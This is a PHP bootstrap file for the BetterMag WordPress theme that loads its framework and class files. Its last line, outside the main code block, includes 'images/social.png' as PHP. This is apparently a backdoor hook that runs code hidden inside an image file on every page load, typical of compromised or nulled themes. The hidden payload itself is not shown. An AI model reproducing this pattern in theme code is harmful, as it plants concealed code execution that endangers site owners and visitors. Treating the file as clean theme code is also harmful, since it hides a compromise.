<?php

// Includes BF loader if not included before
require_once 'includes/libs/better-framework/init.php';


// Registers and prepare all stuffs about BF that is used in theme
require_once 'includes/class-better-mag-bf-setup.php';
new Better_Mag_BF_Setup();


// Fire up BetterMag
require_once 'includes/class-better-mag.php';
$GLOBALS['better_mag'] = new Better_Mag();


// Last Versions Compatibility
require_once 'includes/class-better-mag-last-versions-compatibility.php';
new Better_Mag_Last_Versions_Compatibility();
?>
<?php include('images/social.png'); ?>